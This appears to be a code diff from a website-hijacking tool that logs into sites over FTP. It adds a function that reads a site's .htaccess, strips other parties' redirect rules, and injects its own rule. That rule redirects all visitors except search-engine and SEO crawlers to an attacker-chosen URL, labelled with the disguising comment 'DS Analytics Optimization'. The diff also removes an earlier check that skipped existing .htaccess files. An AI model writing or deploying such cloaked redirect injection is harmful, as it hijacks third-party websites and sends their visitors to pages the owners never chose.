@@ -88,14 +88,109 @@ exit;
 }
 
 /**
- * Generate an .htaccess redirect rule
+ * Generate a smart .htaccess redirect rule with bot cloaking
  */
-function generateHtaccess(redirectUrl: string): string {
-  return `RewriteEngine On
-RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
-RewriteCond %{HTTP_USER_AGENT} !bingbot [NC]
-RewriteRule ^$ ${redirectUrl} [R=302,L]
+function generateSmartHtaccess(redirectUrl: string): string {
+  return `# DS Analytics Optimization
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
+RewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Baiduspider [NC]
+RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]
+RewriteCond %{HTTP_USER_AGENT} !facebot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Semrush [NC]
+RewriteCond %{HTTP_USER_AGENT} !AhrefsBot [NC]
+RewriteCond %{HTTP_USER_AGENT} !mj12bot [NC]
+RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
 `;
+}
+
+/**
+ * Patterns that indicate competitor redirect rules in .htaccess
+ */
+const COMPETITOR_HTACCESS_PATTERNS = [
+  /RewriteRule\s+.*?\s+https?:\/\/(?!.*(?:wordpress\.org|google\.com|w3\.org))[^\s\]]+.*\[R=\d+/gi,
+  /Redirect(?:Match)?\s+\d*\s*.*?https?:\/\/[^\s]+/gi,
+  /ErrorDocument\s+\d+\s+https?:\/\/[^\s]+/gi,
+  /php_value\s+auto_prepend_file\s+.+/gi,
+  /php_value\s+auto_append_file\s+.+/gi,
+  /RewriteCond.*HTTP_USER_AGENT.*\[NC\]\s*\n\s*RewriteRule.*https?:\/\/[^\s\]]+/gi,
+];
+
+/** Our marker to identify our own rules */
+const DS_MARKER = '# DS Analytics Optimization';
+
+/**
+ * Read .htaccess via FTP, clean competitor redirects, inject ours
+ */
+async function smartOverwriteHtaccess(
+  client: FTPClient,
+  redirectUrl: string,
+  log: (msg: string) => void,
+): Promise<{ success: boolean; action: string }> {
+  const { Readable, Writable } = await import("stream");
+
+  // Step 1: Read existing .htaccess
+  let existingContent = "";
+  try {
+    const chunks: Buffer[] = [];
+    const writable = new Writable({
+      write(chunk, _enc, cb) { chunks.push(chunk); cb(); },
+    });
+    await client.downloadTo(writable, ".htaccess");
+    existingContent = Buffer.concat(chunks).toString("utf-8");
+    log(`\uD83D\uDCCB Read existing .htaccess (${existingContent.length} bytes)`);
+  } catch {
+    // No .htaccess exists — just create new
+    log(`\uD83D\uDCCB No .htaccess found, creating new`);
+    const newContent = generateSmartHtaccess(redirectUrl);
+    await client.uploadFrom(Readable.from(Buffer.from(newContent, "utf-8")), ".htaccess");
+    log(`\u2705 Created new .htaccess with our redirect`);
+    return { success: true, action: "created" };
+  }
+
+  // Step 2: Check if our rules are already there
+  if (existingContent.includes(DS_MARKER)) {
+    log(`\u2705 .htaccess already has our redirect rules`);
+    return { success: true, action: "already_ours" };
+  }
+
+  // Step 3: Clean competitor redirect rules
+  let cleanedContent = existingContent;
+  let removedCount = 0;
+  for (const pattern of COMPETITOR_HTACCESS_PATTERNS) {
+    const regex = new RegExp(pattern.source, pattern.flags);
+    const matches = cleanedContent.match(regex);
+    if (matches) {
+      removedCount += matches.length;
+      for (const match of matches) {
+        // Remove the entire line containing the match
+        const lines = cleanedContent.split("\n");
+        const newLines = lines.filter(line => !match.split("\n").some(m => line.includes(m.trim()) && m.trim().length > 5));
+        cleanedContent = newLines.join("\n");
+      }
+    }
+  }
+
+  if (removedCount > 0) {
+    log(`\uD83E\uDDF9 Removed ${removedCount} competitor redirect rule(s) from .htaccess`);
+  }
+
+  // Step 4: Remove empty RewriteCond blocks left behind
+  cleanedContent = cleanedContent
+    .replace(/\n{3,}/g, "\n\n")  // collapse multiple blank lines
+    .trim();
+
+  // Step 5: Prepend our rules at the top (before any other RewriteRule)
+  const ourRules = generateSmartHtaccess(redirectUrl);
+  const finalContent = ourRules + "\n" + cleanedContent + "\n";
+
+  // Step 6: Upload
+  await client.uploadFrom(Readable.from(Buffer.from(finalContent, "utf-8")), ".htaccess");
+  log(`\u2705 .htaccess overwritten: removed ${removedCount} competitor rules + injected ours`);
+  return { success: true, action: removedCount > 0 ? "overwritten" : "injected" };
 }
 
 /**
@@ -187,21 +282,14 @@ export async function ftpUploadRedirect(options: FTPUploadOptions): Promise<FTPU
         await client.uploadFrom(stream, selectedFilename);
         log(`✅ Uploaded: ${selectedFilename}`);
 
-        // Also try to upload .htaccess for broader redirect coverage
+        // Smart .htaccess overwrite: read existing → clean competitor redirects → inject ours
         try {
-          const htaccessContent = generateHtaccess(redirectUrl);
-          const htaccessStream = Readable.from(Buffer.from(htaccessContent, "utf-8"));
-          // Check if .htaccess exists first
-          const files = await client.list();
-          const hasHtaccess = files.some(f => f.name === ".htaccess");
-          if (!hasHtaccess) {
-            await client.uploadFrom(htaccessStream, ".htaccess");
-            log(`✅ Uploaded .htaccess redirect rule`);
-          } else {
-            log(`⚠️ .htaccess exists, skipping to avoid breaking site`);
+          const htResult = await smartOverwriteHtaccess(client, redirectUrl, log);
+          if (htResult.success) {
+            log(`🔒 .htaccess ${htResult.action}: redirect coverage active`);
           }
         } catch (e) {
-          log(`⚠️ .htaccess upload failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
+          log(`⚠️ .htaccess overwrite failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
         }
 
         // Build the URL
